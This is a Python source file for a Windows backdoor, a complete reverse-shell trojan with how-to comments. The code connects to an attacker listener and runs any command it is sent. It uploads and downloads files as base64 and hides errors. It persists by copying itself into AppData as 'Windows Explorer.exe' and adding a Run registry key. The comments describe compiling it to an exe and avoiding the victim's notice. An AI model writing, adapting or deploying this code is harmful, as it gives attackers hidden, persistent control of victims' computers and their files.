#!/usr/bin/env python3

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

# Before using/compile the Backdoor to exe, make sure to check if the IP address and the Port
# are properly filled in. The same is obligatory for Listener file.


class Backdoor:
    """Creating Backdoor"""

    def __init__(self):
        """Creating connection with the server"""

        # initialize persistent
        self.become_persistent()

        self.target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server_ip = "192.168.0.104"
        server_port = 9500

        self.target_socket.connect((server_ip, server_port))

        print("[+] Got connection")

    def become_persistent(self):
        """Executing this function will add the Backdoor to Register allowing us to have always connection"""

        # Changing the path and renaming the exe file
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"

        # checking if we already implement this into the registry
        if not os.path.exists(evil_file_location):

            # copying the exe file to the location which won't be suspicious for the target's user
            shutil.copyfile(sys.executable, evil_file_location)

            # specific command which add the exe file to the registry
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        """
        Send the result from the command
        @param data: result from the command
        """

        # packing the data(user's input) into json format, so we can send it.
        json_data = json.dumps(data)

        # sending the packed json packing
        # send() function can send only bytes, so we need to encode it
        self.target_socket.send(json_data.encode())

    def reliable_receive(self):
        """Receiving output from Listener"""

        # concat bytes from recv function
        json_data = b""

        while True:
            try:
                # receiving bytes from Listener and concat it to one string
                # max buffer 1024
                json_data += self.target_socket.recv(1024)

                # loads() function unpacking the json package
                # it automatically decode the json_data
                return json.loads(json_data)

            # if we receive more than 1024 bytes we receive ValueError
            # when receiving it, continue back to the beginning and concat the result with the previous one
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command_):
        """
        Run the command, like it is running in cmd
        @param command_: command received from the Listener
        @return: returning the result from our command
        """

        # check_output allows us to capture the output
        return subprocess.check_output(command_, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    @staticmethod
    def change_working_dir(path):
        """Changing the current working directory"""

        os.chdir(path)
        return f"[+] Changed directory to: {path}"

    def read_file(self, filename):
        """
        Reading file which was requested from Listener
        @param filename: the file that is requested
        @return: returning the content of the file with base64 encode
        """

        # reading the file with 'rb' mode
        # need to use base64 to encode, because we can encounter some unknown chars
        with open(filename, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, filename, content):
        """
        Creating new file, which was requested from Listener
        @param filename: this is the name of the file, which was sent from Listener
        @param content: this is the result from the file from our Listener
        @return: Simply return that it was successful executing this command
        """

        # we use 'wb' because our reading function in Backdoor use 'rb'
        # if we transfer file with unknown chars we will receive errors
        # for this purpose we need to use base64 to encode with known chars
        with open(filename, "wb") as file:
            file.write(base64.b64decode(content))

            return "[+] Uploaded the file"

    def run(self):
        """Command to run our Backdoor"""

        while True:
            command = self.reliable_receive()

            # because we are working with json, we are able to receive lists
            # we make sure that even with upper/lower case we always exit the program and close the connection
            try:
                if command[0].lower() == "exit":
                    self.target_socket.close()
                    sys.exit()
                # if we have more than 1 arguments, it means that we want to change the dir
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dir(command[1])
                # checking if the command is download
                elif command[0] == "download":
                    # our read_file function use 'rb' In this case we need to decode() our input
                    command_result = self.read_file(command[1]).decode()
                # checking if the command is upload
                elif command[0] == "upload":
                    # first argument is the name of the file
                    # second argument is the content of the file we received
                    command_result = self.write_file(command[1], command[2])
                else:
                    # sometime we receive some strange symbols, which can't be decoded
                    # we need to direct those errors to decode(errors) into ignore state
                    command_result = self.execute_system_command(command).decode(errors='ignore')
            except Exception:
                command_result = "[-] Error during execution"

            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor()
    my_backdoor.run()
except Exception:
    sys.exit()
